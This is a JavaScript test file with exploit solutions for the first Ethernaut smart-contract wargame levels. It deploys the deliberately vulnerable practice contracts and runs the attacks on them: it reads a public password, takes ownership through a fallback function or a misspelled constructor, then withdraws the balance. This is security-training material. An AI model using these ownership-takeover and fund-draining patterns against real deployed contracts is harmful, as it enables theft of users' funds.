const { assert, expect } = require("chai");

describe("Ethernaut", function () {
	let owner, user, hacker = null;
	const invalid           = "0x0000000000000000000000000000000000000000";
	const amount            = ethers.parseEther("0.00001");

	before(async () => {
        [owner, user, hacker] = await ethers.getSigners();
    });

	describe("Level 0 - Instance", async function () {
		it("Exploit", async function () {
			const contract = await ethers.deployContract("Instance", [ethers.encodeBytes32String("ethernaut8")]); // initial password
			const passwordCurrent = await contract.password(); // password is public and as such can be stolen
			await contract.authenticate(passwordCurrent);
			const clearedCurrent = await contract.getCleared();
			assert.isTrue(clearedCurrent, "Failed to pass level 0."); // clear to pass the level
		});
	});

	describe("Level 1 - Fallback", async () => {
		it("Exploit", async () => {
			// const contract = await ethers.deployContract("Fallback");
			// await contract.waitForDeployment();
			// await contract.connect(hacker).contribute({ value: amount }); // send amount less than 0.001 ether to bypass "require" in the next call
			// const transactionHash = await hacker.sendTransaction({ from:hacker.address, to: contract.address, value: amount, data: "0x" }); // trigger the receive() function to set the hacker as the new owner
			// const ownerCurrent = await contract.owner();
			// expect(hacker.address).to.equal(ownerCurrent, "Failed to pass level 1.");
			// await contract.connect(hacker).withdraw(); // withdraw the whole balance to pass the level


			// another example without class objects
			// const instance = Fallback.networks["5777"].address;
			// const contract = new web3.eth.Contract(Fallback.abi, instance);
			// await contract.methods.contribute().call({ from: hacker, value: amount });
			// await web3.eth.sendTransaction({ from: hacker, to: instance, value: amount, data: null });
			// const ownerCurrent = await contract.methods.owner().call();
			// assert.equal(hacker, ownerCurrent, "Failed to pass level 1.");
			// await contract.withdraw({ from: hacker });
		});
	});

	describe("Level 2 - Fallout", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("Fallout");
			await contract.connect(hacker).Fal1out({ value: amount }); // typo in the constructor function makes it a normal function | setting the hacker as the new owner
			const ownerCurrent = await contract.owner();
			expect(hacker.address).to.equal(ownerCurrent, "Failed to pass level 2.");
			await contract.connect(hacker).collectAllocations(); // withdraw the whole balance to pass the level
		});
	});
});
